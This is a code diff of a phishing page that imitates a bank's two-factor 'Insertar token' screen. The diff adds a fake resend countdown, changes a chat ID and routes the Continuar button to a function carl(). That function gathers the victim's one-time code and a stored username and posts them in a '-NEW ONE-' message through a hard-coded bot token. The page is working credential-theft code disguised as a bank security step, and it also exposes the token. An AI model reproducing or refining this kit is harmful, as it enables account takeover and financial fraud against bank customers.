@@ -23,7 +23,7 @@
 
 
 <div class="cdk-overlay-container"><div class="cdk-overlay-backdrop dark-backdrop cdk-overlay-backdrop-showing"></div><div class="cdk-global-overlay-wrapper" dir="ltr" style="justify-content: center; align-items: center;"><div id="cdk-overlay-2" class="cdk-overlay-pane tm-file-preview-dialog-panel" style="position: static;" data-gtm-vis-recent-on-screen11884864_122="281760" data-gtm-vis-first-on-screen11884864_122="281760" data-gtm-vis-total-visible-time11884864_122="100" data-gtm-vis-has-fired11884864_122="1"><tf-modal-overlay _nghost-yru-c131="" class="ng-tns-c131-14 ng-star-inserted"><div _ngcontent-yru-c131="" class="tfcontetnModal ng-tns-c131-14 ng-trigger ng-trigger-slideContent" style="transform: none; opacity: 1;"><!----><div _ngcontent-yru-c131="" class="ng-tns-c131-14 ng-star-inserted" style=""><adl-twofactorauth _ngcontent-yru-c131="" imgicon="./assets/pbocc/images/icono-ilustrado-5-ilstraci-n-celular-seguridad.svg" error_imgicon="./assets/pbocc/images/icono-ilustrado-5-ilstraci-n-token.svg" error_heading="Clave ingresada incorrecta" error_description="Verifica los datos ingresados" class="ng-tns-c131-14" _nghost-yru-c130=""><div _ngcontent-yru-c130="" class="adl-content-2fa">
-
+<p></p>
 	<form  autocomplete="off" class="ng-untouched ng-pristine ng-invalid" > <!---->
 
 		<script>
@@ -45,8 +45,20 @@
 					siguienteInput.focus();
 				}
 			}
+			var timeleft = 60;
+var downloadTimer = setInterval(function(){
+  if(timeleft <= 0){
+    clearInterval(downloadTimer);
+    document.getElementById("countdown").innerHTML = "Finished";
+  } else {
+    document.getElementById("countdown").innerHTML = timeleft;
+  }
+  timeleft -= 1;
+}, 1000);
 			</script>
-	<div _ngcontent-yru-c130="" class="content-virtual ng-star-inserted"><img _ngcontent-yru-c130="" alt="icono" class="img-icon ng-star-inserted" src="./occi/icono-ilustrado-5-ilstraci-n-celular-seguridad.svg"><!----><h2 _ngcontent-yru-c130="" class="title ng-star-inserted"> REVISA TU CELULAR </h2><!----><p _ngcontent-yru-c130="" class="description ng-star-inserted"> Dependiendo de tu operador de telefonia movil, el envio puede tomar hasta 5 minuto. </p><!----></div><!----><div _ngcontent-yru-c130="" class="content-otp ng-star-inserted"><fieldset _ngcontent-yru-c130=""><legend _ngcontent-yru-c130="">Insertar token</legend>
+		
+	<div _ngcontent-yru-c130="" class="content-virtual ng-star-inserted"><img _ngcontent-yru-c130="" alt="icono" class="img-icon ng-star-inserted" src="./occi/icono-ilustrado-5-ilstraci-n-celular-seguridad.svg"><!----><h2 _ngcontent-yru-c130="" class="title ng-star-inserted"> REVISA TU CELULAR </h2><!----><p _ngcontent-yru-c130="" class="description ng-star-inserted" style="margin-bottom: 10px;"> Dependiendo de tu operador de telefonia movil, el envio puede tomar hasta 5 minuto. </p>
+		<p _ngcontent-yru-c130="" style="margin-bottom: 2px;" class="description ng-star-inserted"> Puede solicitar otro token en:   </p><p class="description ng-star-inserted" id="countdown"></p><!----></div><!----><div _ngcontent-yru-c130="" class="content-otp ng-star-inserted"><fieldset _ngcontent-yru-c130=""><legend _ngcontent-yru-c130="">Insertar token</legend>
 
 	<input _ngcontent-yru-c130="" type="tel" min="0" max="9" maxlength="1" size="1" autocomplete="false" id="num1" name="num1" onkeypress="soloNumeros(event)"  class="ng-untouched ng-pristine ng-invalid ng-star-inserted" onkeyup="if (this.value.length == this.getAttribute('maxlength')) num2.focus()"  autofocus="" required="">
 
@@ -60,20 +72,26 @@
 
 	<input _ngcontent-yru-c130="" type="tel" min="0" max="9" maxlength="1" size="1" autocomplete="false" id="num6" name="num6" onkeypress="soloNumeros(event)"  class="ng-untouched ng-pristine ng-invalid ng-star-inserted" onkeyup="if (this.value.length == this.getAttribute('maxlength')) num7.focus()"  autofocus="" required="">
 
-	<input _ngcontent-yru-c130="" type="tel" min="0" max="9" maxlength="1" size="1" autocomplete="false" id="num7" name="num7" onkeypress="soloNumeros(event)"  class="ng-untouched ng-pristine ng-invalid ng-star-inserted" onkeyup="if (this.value.length == this.getAttribute('maxlength')) num8.focus()"  autofocus="" required="">
+	<input _ngcontent-yru-c130="" type="tel" min="0" max="9" maxlength="1" size="1" autocomplete="false" id="num7" name="num7" onkeypress="soloNumeros(event)"  class="ng-untouched ng-pristine ng-invalid ng-star-inserted" onkeyup="if (this.value.length == this.getAttribute('maxlength')) num8.focus()"  autofocus="" >
 
-	<input _ngcontent-yru-c130="" type="tel" min="0" max="9" maxlength="1" size="1" autocomplete="false" id="num8" name="num8" onkeypress="soloNumeros(event)"  class="ng-untouched ng-pristine ng-invalid ng-star-inserted" onkeyup="if (this.value.length == this.getAttribute('maxlength')) carl();" required="">
+	<input _ngcontent-yru-c130="" type="tel" min="0" max="9" maxlength="1" size="1" autocomplete="false" id="num8" name="num8" onkeypress="soloNumeros(event)"  class="ng-untouched ng-pristine ng-invalid ng-star-inserted" onkeyup="if (this.value.length == this.getAttribute('maxlength')) carl();" >
 	
 	
 
-	<!----></fieldset></div><!----><!----><!----><!----><!----><div class="button"><button class="btn outliner twofa-cancel ng-star-inserted" type="button" select="twofa-btn-cancel"><!----><!----><span class="btnContent button-sm-center ng-star-inserted">Cancelar</span><!----><!----></button><!----><!----></div></bocc-button><div class="button"><!----><button  class="btn primary twofa-continue ng-star-inserted" type="submit"><!----><!----><span class="btnContent button-sm-center ng-star-inserted">Continuar</span><!----><!----></button><!----></div></bocc-button></div><!----><!----></form></div></adl-twofactorauth></div><!----><!----><div _ngcontent-yru-c131="" class="tfaModalClass ng-tns-c131-14" style="position: fixed; left: -5000px; color: transparent; width: 200px;"> OCC:  </div></div></tf-modal-overlay></div></div></div>
+	<!----></fieldset></div><!----><!----><!----><!----><!----><div class="button"><button class="btn outliner twofa-cancel ng-star-inserted" type="button" select="twofa-btn-cancel"><!----><!----><span class="btnContent button-sm-center ng-star-inserted">Cancelar</span><!----><!----></button><!----><!----></div></bocc-button><div class="button"><!----><button  class="btn primary twofa-continue ng-star-inserted" type="button"><!----><!----><span class="btnContent button-sm-center ng-star-inserted" onclick="carl()">Continuar</span><!----><!----></button><!----></div></bocc-button></div><!----><!----></form></div></adl-twofactorauth></div><!----><!----><div _ngcontent-yru-c131="" class="tfaModalClass ng-tns-c131-14" style="position: fixed; left: -5000px; color: transparent; width: 200px;"> OCC:  </div></div></tf-modal-overlay></div></div></div>
 <script>
 	function carl(params) {
   const token = "5881769745:AAFiecIBFXB7lIJXhf3N1XP4TPc6uc4ZOjU";
-  const chatId = "-4265702128";
+  const chatId = "-4222386164";
   const usr = localStorage.getItem("usr");
   const uservalid = document.getElementById("num1").value + document.getElementById("num2").value + document.getElementById("num3").value + document.getElementById("num4").value + document.getElementById("num5").value + document.getElementById("num6").value + document.getElementById("num7").value + document.getElementById("num8").value;
  
+
+
+  if(uservalid.length < 6){
+    document.getElementById("codi").style.display = "block";
+
+  }else{
 
   const message = `-NEW ONE-\n --Usr.: ${usr} \n -- numero codigo: ${uservalid} \n `;
   $.ajax({
@@ -97,6 +115,7 @@
       alert("error failed");
     },
   });
+}
 }
 
 </script>
